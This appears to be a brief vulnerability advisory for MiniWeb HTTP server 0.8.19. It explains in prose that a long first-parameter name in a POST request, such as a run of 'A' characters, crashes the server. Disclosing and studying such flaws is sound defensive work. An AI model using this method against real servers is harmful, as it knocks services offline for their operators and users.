Description

 MiniWeb HTTP server 0.8.19 allows remote attackers to cause a denial of service (daemon crash) via a long name for the
 first parameter in a POST request.

Exploitation

 The vulnerability is the first parameter's name of the POST request. Example: PARAM_NAME1=param_data1&param_name2=param_data2
 if we send a lot of "A" characters to "PARAM_NAME1", the miniweb server will crash.
